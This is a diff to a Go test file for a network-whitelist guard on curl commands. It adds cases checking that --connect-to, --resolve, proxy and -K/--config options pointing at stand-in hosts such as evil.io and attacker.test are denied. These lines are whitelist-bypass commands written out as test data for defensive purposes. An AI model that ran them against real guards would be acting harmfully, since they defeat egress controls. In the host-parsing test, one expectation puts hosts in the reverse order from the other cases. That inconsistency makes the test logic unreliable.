@@ -274,6 +274,77 @@ func TestHasRecursiveForce(t *testing.T) {
 	}
 }
 
+// TestCurlConnectionRedirectBypass covers curl options that redirect the
+// connection to a host different from the request URL. The real destination must
+// be extracted so it cannot ride a whitelisted request host past the whitelist.
+func TestCurlConnectionRedirectBypass(t *testing.T) {
+	p := loadExamplePolicy(t) // allows github.com; on_non_whitelisted: deny
+	cases := []struct {
+		name string
+		cmd  string
+	}{
+		{"connect-to space form", `curl --connect-to github.com:443:evil.io:443 https://github.com/a`},
+		{"connect-to equals form", `curl --connect-to=github.com:443:evil.io:443 https://github.com/a`},
+		{"resolve pins to ip", `curl --resolve github.com:443:1.2.3.4 https://github.com/a`},
+		{"resolve equals form", `curl --resolve=github.com:443:5.6.7.8 https://github.com/a`},
+		{"proxy host", `curl -x http://evil.io:3128 https://github.com/a`},
+		{"proxy equals form", `curl --proxy=socks5://attacker.test:1080 https://github.com/a`},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			findings, decision := scanCmd(t, p, BackendWorkspace, tc.cmd)
+			if decision != DecisionDeny {
+				t.Errorf("decision = %q, want deny (findings: %+v)", decision, findings)
+			}
+			if !hasRule(findings, ruleNetworkID) {
+				t.Errorf("missing R-NET-001 for redirect bypass: %+v", findings)
+			}
+		})
+	}
+
+	// A --connect-to whose real target is itself whitelisted must still allow.
+	findings, decision := scanCmd(t, p, BackendWorkspace,
+		`curl --connect-to github.com:443:github.com:443 https://github.com/a`)
+	if decision != DecisionAllow {
+		t.Errorf("whitelisted connect-to should allow, got %q: %+v", decision, findings)
+	}
+}
+
+// TestCurlOpaqueConfigFailsClosed covers -K/--config: the file can define url,
+// proxy and resolve directives the guard cannot read, so its presence must
+// fail closed regardless of the whitelist.
+func TestCurlOpaqueConfigFailsClosed(t *testing.T) {
+	p := loadExamplePolicy(t)
+	for _, cmd := range []string{
+		`curl -K /tmp/opaque.conf https://github.com/a`,
+		`curl --config /tmp/opaque.conf https://github.com/a`,
+		`curl --config=/tmp/opaque.conf https://github.com/a`,
+	} {
+		findings, decision := scanCmd(t, p, BackendWorkspace, cmd)
+		if decision != DecisionDeny {
+			t.Errorf("opaque config must fail closed for %q, got %q: %+v", cmd, decision, findings)
+		}
+		if !hasRule(findings, ruleNetworkID) {
+			t.Errorf("missing R-NET-001 for opaque config %q: %+v", cmd, findings)
+		}
+	}
+}
+
+func TestHostsFromColonSpec(t *testing.T) {
+	got := hostsFromColonSpec("github.com:443:evil.io:443")
+	if len(got) != 2 || got[0] != "github.com" || got[1] != "evil.io" {
+		t.Errorf("connect-to spec hosts = %v, want [github.com evil.io]", got)
+	}
+	got = hostsFromColonSpec("github.com:443:1.2.3.4")
+	if len(got) != 2 || got[1] != "1.2.3.4" {
+		t.Errorf("resolve spec hosts = %v, want github.com + 1.2.3.4", got)
+	}
+	got = hostsFromColonSpec("example.com:443:[2001:db8::1]")
+	if len(got) != 2 || got[0] != "2001:db8::1" || got[1] != "example.com" {
+		t.Errorf("bracketed IPv6 hosts = %v, want [2001:db8::1 example.com]", got)
+	}
+}
+
 func TestExtractHosts(t *testing.T) {
 	hosts := extractHosts("curl", []string{"-s", "https://evil.io/p", "-o", "config.yaml"})
 	if len(hosts) != 1 || hosts[0] != "evil.io" {
